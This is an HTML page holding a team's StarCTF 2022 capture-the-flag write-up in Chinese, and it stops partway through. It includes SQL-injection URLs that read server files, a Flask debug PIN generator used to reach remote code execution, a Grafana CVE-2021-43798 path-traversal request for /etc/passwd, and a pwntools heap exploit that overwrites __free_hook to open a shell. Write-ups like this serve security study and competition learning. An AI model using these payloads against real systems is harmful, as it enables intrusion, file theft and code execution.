@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Web oh-my-notepro debug 模式为开，随便试一试即可触发报错，note_id 处存在注入，使用 load data local infile &#39;xx&#39; into table xx 可以读文件。
+创建临时表：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--&#43; 把文件写入表中：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--&#43; 读取数据：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--&#43; debug模式为开，考虑计算flask debug pin，exp如下：
+import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id &#43; boot_id &#43; cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.'><title></title>
+
+<link rel='canonical' href='https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content=''>
+<meta property='og:description' content='Web oh-my-notepro debug 模式为开，随便试一试即可触发报错，note_id 处存在注入，使用 load data local infile &#39;xx&#39; into table xx 可以读文件。
+创建临时表：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--&#43; 把文件写入表中：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--&#43; 读取数据：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--&#43; debug模式为开，考虑计算flask debug pin，exp如下：
+import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id &#43; boot_id &#43; cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.'>
+<meta property='og:url' content='https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/'>
+<meta property='og:site_name' content='or4nge'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="">
+<meta name="twitter:description" content="Web oh-my-notepro debug 模式为开，随便试一试即可触发报错，note_id 处存在注入，使用 load data local infile &#39;xx&#39; into table xx 可以读文件。
+创建临时表：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;create table otable(data varchar(10000));--&#43; 把文件写入表中：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,4,5;load data local infile &amp;#34;/app/app.py&amp;#34; into table otable;--&#43; 读取数据：
+http://123.60.72.85:5002/view?note_id=&amp;#39; union select 1,2,3,(select group_concat(data, &amp;#39;\n&amp;#39;) from (select data from otable limit 0,50)x),5;--&#43; debug模式为开，考虑计算flask debug pin，exp如下：
+import hashlib from itertools import chain def get_machine_id(): machine_id = &amp;#39;1cc402dd0e11d5ae18db04a6de87223d&amp;#39; # /etc/machine-id  boot_id = &amp;#39;&amp;#39; # /proc/sys/kernel/random/boot_id  cgroup = &amp;#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&amp;#39; # /proc/1/cgroup  linux = machine_id &#43; boot_id &#43; cgroup return linux rv = None num = None mac = &amp;#39;02:42:ac:1c:00:03&amp;#39;# /sys/class/net/eth0/address  probably_public_bits = [ &amp;#39;ctf&amp;#39;,# username  &amp;#39;flask.">
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/post/starctf2022-writeup-by-or4nge/"></a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    10 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h2 id="web">Web</h2>
+<h3 id="oh-my-notepro">oh-my-notepro</h3>
+<p>debug 模式为开，随便试一试即可触发报错，note_id 处存在注入，使用 <code>load data local infile 'xx' into table xx</code> 可以读文件。</p>
+<p>创建临时表：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#ae81ff">123.60</span><span style="color:#f92672">.</span><span style="color:#ae81ff">72.85</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5002</span><span style="color:#f92672">/</span><span style="color:#a6e22e">view</span><span style="color:#f92672">?</span><span style="color:#a6e22e">note_id</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#a6e22e">union</span> <span style="color:#a6e22e">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>;<span style="color:#a6e22e">create</span> <span style="color:#a6e22e">table</span> <span style="color:#a6e22e">otable</span>(<span style="color:#a6e22e">data</span> <span style="color:#a6e22e">varchar</span>(<span style="color:#ae81ff">10000</span>));<span style="color:#f92672">--+</span>
+</code></pre></div><p>把文件写入表中：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#ae81ff">123.60</span><span style="color:#f92672">.</span><span style="color:#ae81ff">72.85</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5002</span><span style="color:#f92672">/</span><span style="color:#a6e22e">view</span><span style="color:#f92672">?</span><span style="color:#a6e22e">note_id</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#a6e22e">union</span> <span style="color:#a6e22e">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>;<span style="color:#a6e22e">load</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">local</span> <span style="color:#a6e22e">infile</span> <span style="color:#e6db74">&#34;/app/app.py&#34;</span> <span style="color:#a6e22e">into</span> <span style="color:#a6e22e">table</span> <span style="color:#a6e22e">otable</span>;<span style="color:#f92672">--+</span>
+</code></pre></div><p>读取数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#ae81ff">123.60</span><span style="color:#f92672">.</span><span style="color:#ae81ff">72.85</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5002</span><span style="color:#f92672">/</span><span style="color:#a6e22e">view</span><span style="color:#f92672">?</span><span style="color:#a6e22e">note_id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39; union select 1,2,3,(select group_concat(data, &#39;</span><span style="color:#a6e22e">\n</span><span style="color:#960050;background-color:#1e0010">&#39;</span>) <span style="color:#a6e22e">from</span> (<span style="color:#a6e22e">select</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">otable</span> <span style="color:#a6e22e">limit</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">50</span>)<span style="color:#a6e22e">x</span>),<span style="color:#ae81ff">5</span>;<span style="color:#f92672">--+</span>
+</code></pre></div><p>debug模式为开，考虑计算flask debug pin，exp如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">import</span> <span style="color:#a6e22e">hashlib</span>
+<span style="color:#a6e22e">from</span> <span style="color:#a6e22e">itertools</span> <span style="color:#a6e22e">import</span> <span style="color:#a6e22e">chain</span>
+<span style="color:#a6e22e">def</span> <span style="color:#a6e22e">get_machine_id</span>()<span style="color:#f92672">:</span>
+    <span style="color:#a6e22e">machine_id</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1cc402dd0e11d5ae18db04a6de87223d&#39;</span> <span style="color:#75715e"># /etc/machine-id
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">boot_id</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#75715e"># /proc/sys/kernel/random/boot_id
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">cgroup</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;4b13f9ab9776ea7cf70e6ab9b3a06f5987e0d7b73fe5703ecf8e1d06018ebc71&#39;</span> <span style="color:#75715e"># /proc/1/cgroup
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">linux</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">machine_id</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">boot_id</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">cgroup</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">linux</span>
+<span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">None</span>
+<span style="color:#a6e22e">num</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">None</span>
+<span style="color:#a6e22e">mac</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;02:42:ac:1c:00:03&#39;</span><span style="color:#75715e"># /sys/class/net/eth0/address
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">probably_public_bits</span> <span style="color:#f92672">=</span> [
+    <span style="color:#e6db74">&#39;ctf&#39;</span>,<span style="color:#75715e"># username
+</span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#39;flask.app&#39;</span>,<span style="color:#75715e"># modname
+</span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#39;Flask&#39;</span>,<span style="color:#75715e"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
+</span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39;</span> <span style="color:#75715e"># getattr(mod, &#39;__file__&#39;, None),
+</span><span style="color:#75715e"></span>]
+<span style="color:#a6e22e">private_bits</span> <span style="color:#f92672">=</span> [
+    <span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">int</span>(<span style="color:#a6e22e">mac</span><span style="color:#f92672">.</span><span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;:&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>), <span style="color:#ae81ff">16</span>)),
+    <span style="color:#a6e22e">get_machine_id</span>()
+]
+<span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hashlib</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sha1</span>()
+<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">bit</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">chain</span>(<span style="color:#a6e22e">probably_public_bits</span>, <span style="color:#a6e22e">private_bits</span>)<span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">not</span> <span style="color:#a6e22e">bit</span><span style="color:#f92672">:</span>
+        <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">isinstance</span>(<span style="color:#a6e22e">bit</span>, <span style="color:#a6e22e">str</span>)<span style="color:#f92672">:</span>
+        <span style="color:#a6e22e">bit</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bit</span><span style="color:#f92672">.</span><span style="color:#a6e22e">encode</span>(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+    <span style="color:#a6e22e">h</span><span style="color:#f92672">.</span><span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">bit</span>)
+<span style="color:#a6e22e">h</span><span style="color:#f92672">.</span><span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#34;cookiesalt&#34;</span>)
+<span style="color:#a6e22e">cookie_name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;__wzd{h.hexdigest()[:20]}&#34;</span>
+<span style="color:#75715e"># If we need to generate a pin we salt it a bit more so that we don&#39;t
+</span><span style="color:#75715e"># end up with the same value and generate out 9 digits
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">num</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">None</span><span style="color:#f92672">:</span>
+    <span style="color:#a6e22e">h</span><span style="color:#f92672">.</span><span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#34;pinsalt&#34;</span>)
+    <span style="color:#a6e22e">num</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;{int(h.hexdigest(), 16):09d}&#34;</span>[<span style="color:#f92672">:</span><span style="color:#ae81ff">9</span>]
+<span style="color:#75715e"># Format the pincode in groups of digits for easier remembering if
+</span><span style="color:#75715e"># we don&#39;t have a result yet.
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rv</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">None</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">group_size</span> <span style="color:#a6e22e">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">num</span>) <span style="color:#f92672">%</span> <span style="color:#a6e22e">group_size</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
+            <span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">join</span>(
+                <span style="color:#a6e22e">num</span>[<span style="color:#a6e22e">x</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">group_size</span>]<span style="color:#f92672">.</span><span style="color:#a6e22e">rjust</span>(<span style="color:#a6e22e">group_size</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
+                <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">x</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">num</span>), <span style="color:#a6e22e">group_size</span>)
+            )
+            <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
+            <span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">num</span>
+<span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">rv</span>)
+</code></pre></div><p>算出pin，访问/console即可rce。</p>
+<h3 id="oh-my-lotto">oh-my-lotto</h3>
+<p>将环境变量PATH设置为空即可跳过wget命令。第一次正常访问/lotto，然后访问/result获取结果，然后上传至/forecast，然后再次访问/lotto，提供环境变量PATH为空，即可使forecast与result相同，获得flag。</p>
+<h3 id="oh-my-grafana">oh-my-grafana</h3>
+<p>cve-2021-43798任意文件读：GET /public/plugins/welcome/../../../../../../../../etc/passwd HTTP/1.1</p>
+<p>读到了配置文件：/public/plugins/welcome/../../../../../../../..//etc/grafana/grafana.ini</p>
+<p>发现唯一生效的配置文件就是 adminpassword</p>
+<p>admin_user = admin</p>
+<p>admin_password = 5f989714e132c9b04d4807dafeb10ade</p>
+<p>看上去是个md5，但是实际上就是密码（在非隔离环境下需要多登录几次）</p>
+<p>登进去后有个mysql服务，可以任意查询语句，趁着一堆人直接上车 <code>select * from fffffflllllllllaaaagggggg</code></p>
+<h2 id="pwn">Pwn</h2>
+<h3 id="examination">examination</h3>
+<p>leak，任意地址添加 1 更改 len，堆溢出</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./examination&#34;</span>)
+<span style="color:#75715e"># p = remote(&#34;124.70.130.92&#34;, 60001)</span>
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
+
+	
+
+    
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">debugf</span>(b<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+    <span style="color:#66d9ef">if</span> debug:
+        <span style="color:#66d9ef">if</span> b:
+            gdb<span style="color:#f92672">.</span>attach(p,<span style="color:#e6db74">&#34;b *$rebase(</span><span style="color:#e6db74">{b}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(b <span style="color:#f92672">=</span> hex(b)))
+        <span style="color:#66d9ef">else</span>:
+            gdb<span style="color:#f92672">.</span>attach(p)
+            
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./examination&#39;</span>)
+
+
+
+ru <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
+sn <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
+rl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()
+sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)
+rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recv(x)
+sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendafter(a,b)
+sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendlineafter(a, b)
+
+heap_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(i):
+    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;choice&gt;&gt; &#34;</span>, str(i))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_student</span>(q):
+    menu(<span style="color:#ae81ff">1</span>)
+    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;questions:&#34;</span>, str(q))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">give_score</span>():
+    menu(<span style="color:#ae81ff">2</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_view</span>(i, size, content, flag):
+    menu(<span style="color:#ae81ff">3</span>)
+    sla(<span style="color:#e6db74">&#34;which one? &gt;&#34;</span>, str(i))
+    <span style="color:#66d9ef">if</span> flag <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
+        sla(<span style="color:#e6db74">&#34;please input the size of comment: &#34;</span>, str(size))
+    sa(<span style="color:#e6db74">&#34;enter your comment:&#34;</span>, content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(i):
+    menu(<span style="color:#ae81ff">4</span>)
+    sla(<span style="color:#e6db74">&#34;choose?&#34;</span>, str(i))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change_role</span>(i):
+    menu(<span style="color:#ae81ff">5</span>)
+    sla(<span style="color:#e6db74">&#34;role: &lt;0.teacher/1.student&gt;:&#34;</span>, str(i))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pray</span>():
+    menu(<span style="color:#ae81ff">3</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_view</span>():
+    menu(<span style="color:#ae81ff">2</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reward</span>():
+    menu(<span style="color:#ae81ff">2</span>)
+    ru(<span style="color:#e6db74">&#34;reward! &#34;</span>)
+    base <span style="color:#f92672">=</span> ru(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    <span style="color:#66d9ef">global</span> heap_base
+    heap_base <span style="color:#f92672">=</span> int(base, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2a0</span>
+    print(hex(heap_base))
+    sla(<span style="color:#e6db74">&#34;addr: &#34;</span>, str(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2e0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_mode</span>(i):
+    menu(<span style="color:#ae81ff">4</span>)
+    sla(<span style="color:#e6db74">&#34;100&#34;</span>, str(i))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change_id</span>(i):
+    menu(<span style="color:#ae81ff">6</span>)
+    sla(<span style="color:#e6db74">&#34;id:&#34;</span>, str(i))
+
+
+
+
+
+sl(<span style="color:#e6db74">&#34;0&#34;</span>)
+add_student(<span style="color:#ae81ff">1</span>)
+change_role(<span style="color:#ae81ff">1</span>)
+pray()
+change_role(<span style="color:#ae81ff">0</span>)
+give_score()
+
+write_view(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0</span>)
+change_role(<span style="color:#ae81ff">1</span>)
+reward()
+change_role(<span style="color:#ae81ff">0</span>)
+add_student(<span style="color:#ae81ff">1</span>)
+payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x340</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x41</span>) <span style="color:#f92672">+</span> p64(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x2a0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x120</span>)
+write_view(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x118</span> ,payload1, <span style="color:#ae81ff">1</span>)
+
+write_view(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x118</span>, p16(<span style="color:#ae81ff">0x7</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">1</span>)
+
+add_student(<span style="color:#ae81ff">2</span>)
+write_view(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0</span>)
+add_student(<span style="color:#ae81ff">3</span>)
+write_view(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0x8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0</span>)
+free(<span style="color:#ae81ff">2</span>)
+
+change_role(<span style="color:#ae81ff">1</span>)
+change_id(<span style="color:#ae81ff">1</span>)
+menu(<span style="color:#ae81ff">2</span>)
+ru(<span style="color:#e6db74">&#34;review:&#34;</span>)
+rv(<span style="color:#ae81ff">0x3a1</span>)
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__malloc_hook&#34;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">96</span>
+print(hex(libc<span style="color:#f92672">.</span>address))
+change_role(<span style="color:#ae81ff">0</span>)
+payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x340</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x41</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x2a0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x120</span>)
+write_view(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x118</span>, payload2, <span style="color:#ae81ff">1</span>)
+write_view(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x118</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]), <span style="color:#ae81ff">1</span>)
+
+gdb<span style="color:#f92672">.</span>attach(p)
+<span style="color:#75715e"># free(3)</span>
+p<span style="color:#f92672">.</span>interactive()
